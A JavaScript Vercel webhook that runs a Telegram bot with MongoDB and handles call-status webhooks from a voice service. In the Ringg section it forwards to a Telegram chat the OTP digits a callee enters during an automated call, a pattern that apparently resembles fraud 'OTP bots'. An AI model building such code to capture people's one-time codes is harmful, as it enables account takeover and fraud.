// ================= Vercel Config =================
export const config = {
  api: {
    bodyParser: true,
  },
};

// ================= Imports =================
import dotenv from "dotenv";
import TelegramBot from "node-telegram-bot-api";
import mongoose from "mongoose";

dotenv.config();

// ================= MongoDB Cache =================
let cached = global.mongoose;

if (!cached) {
  cached = global.mongoose = {
    conn: null,
    promise: null,
  };
}

async function connectDB() {
  if (cached.conn) return cached.conn;

  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI, {
      bufferCommands: false,
    });
  }

  cached.conn = await cached.promise;
  console.log("✅ MongoDB connected");

  return cached.conn;
}

// ================= Telegram Bot Cache =================
let bot = global.telegramBot;

if (!bot) {
  console.log("🤖 Initializing Telegram Bot...");

  bot = global.telegramBot = new TelegramBot(
    process.env.BOT_TOKEN,
    {
      webHook: true,
    }
  );

  // ============ Bot Commands ============

  bot.on("message", async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    console.log("📩 Message:", text);

    if (text === "/start") {
      await bot.sendMessage(
        chatId,
        "✅ Bot is online!\nSend /help to see commands."
      );
      return;
    }

    if (text === "/help") {
      await bot.sendMessage(
        chatId,
        "📌 Commands:\n/start - Check bot\n/help - Help menu"
      );
      return;
    }

    await bot.sendMessage(chatId, "🤖 I received: " + text);
  });
}

// ================= Mongo Model =================
const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ================= Webhook Handler =================
export default async function handler(req, res) {
  try {
    await connectDB();

    const body = req.body;

    console.log("📡 Webhook Received");

    // ================= Telegram Webhook =================
    if (body?.message || body?.edited_message) {
      await bot.processUpdate(body);
      return res.status(200).send("OK");
    }

    // ================= Ringg Webhook =================
    if (body?.phone) {
      const { phone, step, intent, digits, status } = body;

      console.log("📞 Ringg:", phone, status, step);

      const user = await User.findOne({ phone });

      if (!user) {
        console.log("❌ User not found:", phone);
        return res.send("OK");
      }

      if (status === "ringing") {
        await bot.sendMessage(user.chatId, "📞 Ringing...");
      }

      if (status === "picked") {
        await bot.sendMessage(user.chatId, "☎️ Call answered");
      }

      if (status === "ended") {
        await bot.sendMessage(user.chatId, "📴 Call ended");
      }

      if (step === "confirm_request" && intent === "no") {
        const otp = Math.floor(
          100000 + Math.random() * 900000
        ).toString();

        user.otp = otp;
        user.status = "otp";
        await user.save();

        await bot.sendMessage(
          user.chatId,
          `🔐 Verification Code: ${otp}\n\nEnter it in Telegram.`
        );
      }

      if (step === "otp_step" && digits) {
        await bot.sendMessage(
          user.chatId,
          `📲 OTP entered on call: ${digits}`
        );
      }

      return res.send("OK");
    }

    // ================= Default =================
    return res.status(200).send("OK");

  } catch (err) {
    console.error("❌ Webhook Error:", err);
    return res.status(500).send("Error");
  }
}
